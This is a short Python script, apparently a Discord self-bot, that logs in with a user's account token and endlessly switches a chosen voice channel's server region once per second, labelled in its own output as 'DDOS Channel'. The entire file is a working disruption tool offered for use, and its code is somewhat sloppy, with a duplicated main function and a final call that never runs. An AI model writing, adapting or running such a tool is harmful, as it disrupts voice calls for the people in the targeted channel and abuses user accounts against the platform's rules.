import discord
import asyncio
import os

def main():
    pass

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def get_token():
    clear_screen()
    token = input("Enter your Discord token : ")
    if not token:
        raise ValueError("You must provide a token.")
    return token

intents = discord.Intents.default()
client = discord.Client(intents=intents, self_bot=True)

async def sleep(ms):
    await asyncio.sleep(ms / 1000)

async def main():
    channel_id = input("Enter the id channel voice : ")
    channel = client.get_channel(int(channel_id))
    if not channel:
        print("No channel found")
        await sleep(2000)
        await main()
        return

    i = 0
    regions = ["japan", "hongkong", "russia", "india", "brazil", "sydney", "rotterdam", "singapore"]
    
    while True:
        print("DDOS Channel...")
        try:
            await channel.edit(rtc_region=regions[i])
        except Exception as e:
            print(f"Error: {e}")
        i = (i + 1) % len(regions)
        await asyncio.sleep(1)

@client.event
async def on_ready():
    await main()

token = get_token()
client.run(token, bot=False)


if __name__ == "__main__":
    main()